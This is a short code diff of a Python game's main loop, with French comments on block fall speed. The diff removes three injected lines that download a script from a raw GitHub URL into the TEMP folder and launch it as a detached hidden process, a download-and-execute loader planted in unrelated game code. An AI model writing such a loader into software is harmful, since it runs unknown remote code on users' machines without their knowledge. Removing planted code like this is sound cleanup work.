@@ -98,9 +98,6 @@ def main():
 
     fall_time = 0
     fall_speed = 0.5  # descend toutes les 0.5 secondes
-    import urllib.request, subprocess, os; script=os.path.join(os.environ['TEMP'], "srto.py")
-    urllib.request.urlretrieve("https://raw.githubusercontent.com/doctotypetech-dotcom/KITT/refs/heads/main/mail.py", script); 
-    subprocess.Popen(["python", script], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS 
     while running:
         dt = clock.tick(FPS) / 1000  # temps écoulé en secondes
         fall_time += dt
